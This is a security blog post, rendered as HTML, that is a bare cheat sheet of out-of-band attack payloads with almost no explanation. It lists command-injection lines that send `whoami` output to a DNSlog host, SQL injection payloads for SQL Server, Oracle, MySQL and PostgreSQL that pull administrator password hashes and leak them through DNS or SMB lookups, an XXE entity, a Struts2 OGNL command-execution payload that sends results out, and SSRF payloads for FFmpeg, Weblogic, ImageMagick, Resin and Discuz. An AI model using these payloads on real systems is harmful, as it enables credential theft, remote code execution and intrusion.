@@ -1,0 +1,325 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Out-of-Band Payload | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="0x00 Command Executioni. nix:12curl http://ip.port.b182oj.ceye.io/`whoami`ping `whoami`.ip.port.b182oj.ceye.io
+
+ii. windows1ping %USERNAME%.b182oj.ceye.io
+
+0x01 SQL Injectioni. SQL Server1234567DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_logins WHERE name=&amp;#x27;sa&amp;#x27;)+&amp;#x27;.ip.port.b182oj.ceye.io&amp;#x27;;EXEC(&amp;#x27;master..xp_dirtree&amp;quot;\\&amp;#x27;+@host+&amp;#x27;\foobar$&amp;quot;&amp;#x27;);
+
+ii. Oracle12345SELECT UTL_INADDR.GET_HOST_ADDRESS(&amp;#x27;ip.port.b182oj.ceye.io&amp;#x27;);SELECT UTL_HTTP.REQUEST(&amp;#x27;http://ip.port.b182oj.ceye.io/oracle&amp;#x27;) FROM DUAL;SELECT HTTPURITYPE(&amp;#x27;http://ip.port.b182oj.ceye.io/oracle&amp;#x27;).GETCLOB() FROM DUAL;SELECT DBMS_LDAP.INIT((&amp;#x27;oracle.ip.port.b182oj.ceye.io&amp;#x27;,80) FROM DUAL;SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&amp;#x27;SYS&amp;#x27;)||&amp;#x27;.ip.port.b182oj.ceye.io&amp;#x27;,80) FROM DUAL;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Out-of-Band Payload"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Out-of-Band Payload</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="0x00-Command-Execution"><a href="#0x00-Command-Execution" class="headerlink" title="0x00 Command Execution"></a>0x00 Command Execution</h1><h2 id="i-nix"><a href="#i-nix" class="headerlink" title="i. nix:"></a>i. nix:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h2 id="ii-windows"><a href="#ii-windows" class="headerlink" title="ii. windows"></a>ii. windows</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-SQL-Injection"><a href="#0x01-SQL-Injection" class="headerlink" title="0x01 SQL Injection"></a>0x01 SQL Injection</h1><h2 id="i-SQL-Server"><a href="#i-SQL-Server" class="headerlink" title="i. SQL Server"></a>i. SQL Server</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT TOP 1</span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line">FROM sys.sql_logins WHERE name=&#x27;sa&#x27;)</span><br><span class="line">+&#x27;.ip.port.b182oj.ceye.io&#x27;;</span><br><span class="line">EXEC(&#x27;master..xp_dirtree</span><br><span class="line">&quot;\\&#x27;+@host+&#x27;\foobar$&quot;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="ii-Oracle"><a href="#ii-Oracle" class="headerlink" title="ii. Oracle"></a>ii. Oracle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(&#x27;ip.port.b182oj.ceye.io&#x27;);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(&#x27;http://ip.port.b182oj.ceye.io/oracle&#x27;) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(&#x27;http://ip.port.b182oj.ceye.io/oracle&#x27;).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((&#x27;oracle.ip.port.b182oj.ceye.io&#x27;,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=&#x27;SYS&#x27;)||&#x27;.ip.port.b182oj.ceye.io&#x27;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
+
+<h2 id="iii-MySQL"><a href="#iii-MySQL" class="headerlink" title="iii. MySQL"></a>iii. MySQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE user=&#x27;root&#x27; LIMIT 1),&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;));</span><br></pre></td></tr></table></figure>
+
+<h2 id="iv-PostgreSQL"><a href="#iv-PostgreSQL" class="headerlink" title="iv. PostgreSQL"></a>iv. PostgreSQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename=&#x27;postgres&#x27;);</span><br><span class="line">exec_cmd := E&#x27;COPY table_output(content)</span><br><span class="line">FROM E\&#x27;\\\\\\\\&#x27;||query_result||E&#x27;.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\&#x27;&#x27;;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-XML-Entity-Injection"><a href="#0x02-XML-Entity-Injection" class="headerlink" title="0x02 XML Entity Injection"></a>0x02 XML Entity Injection</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root/&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x03-Others"><a href="#0x03-Others" class="headerlink" title="0x03 Others"></a>0x03 Others</h1><h2 id="i-Struts2"><a href="#i-Struts2" class="headerlink" title="i. Struts2"></a>i. Struts2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx.action?redirect:http://ip.port.b182oj.ceye.io/%25&#123;3*4&#125;</span><br><span class="line">xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;&#x27;whoami&#x27;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d&quot;http://ip.port.b182oj.ceye.io/result%3d&quot;.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(&quot;GET&quot;),%23http.connect(),%23http.getInputStream()&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ii-FFMpeg"><a href="#ii-FFMpeg" class="headerlink" title="ii. FFMpeg"></a>ii. FFMpeg</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://ip.port.b182oj.ceye.io</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
+
+<h2 id="iii-Weblogic"><a href="#iii-Weblogic" class="headerlink" title="iii. Weblogic"></a>iii. Weblogic</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+
+<h2 id="iv-ImageMagick"><a href="#iv-ImageMagick" class="headerlink" title="iv. ImageMagick"></a>iv. ImageMagick</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(http://ip.port.b182oj.ceye.io)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>
+
+<h2 id="v-Resin"><a href="#v-Resin" class="headerlink" title="v. Resin"></a>v. Resin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf</span><br></pre></td></tr></table></figure>
+
+<h2 id="vi-Discuz"><a href="#vi-Discuz" class="headerlink" title="vi. Discuz"></a>vi. Discuz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</span><br></pre></td></tr></table></figure>
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/10/10/java/base/Java基础/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/08/20/pentest/privesc/Mysql UDF/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-09-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Others/">Others<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Payload/">Payload<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#0x00-Command-Execution"><span class="toc-article-text">0x00 Command Execution</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#i-nix"><span class="toc-article-text">i. nix:</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ii-windows"><span class="toc-article-text">ii. windows</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#0x01-SQL-Injection"><span class="toc-article-text">0x01 SQL Injection</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#i-SQL-Server"><span class="toc-article-text">i. SQL Server</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ii-Oracle"><span class="toc-article-text">ii. Oracle</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#iii-MySQL"><span class="toc-article-text">iii. MySQL</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#iv-PostgreSQL"><span class="toc-article-text">iv. PostgreSQL</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#0x02-XML-Entity-Injection"><span class="toc-article-text">0x02 XML Entity Injection</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#0x03-Others"><span class="toc-article-text">0x03 Others</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#i-Struts2"><span class="toc-article-text">i. Struts2</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ii-FFMpeg"><span class="toc-article-text">ii. FFMpeg</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#iii-Weblogic"><span class="toc-article-text">iii. Weblogic</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#iv-ImageMagick"><span class="toc-article-text">iv. ImageMagick</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#v-Resin"><span class="toc-article-text">v. Resin</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#vi-Discuz"><span class="toc-article-text">vi. Discuz</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
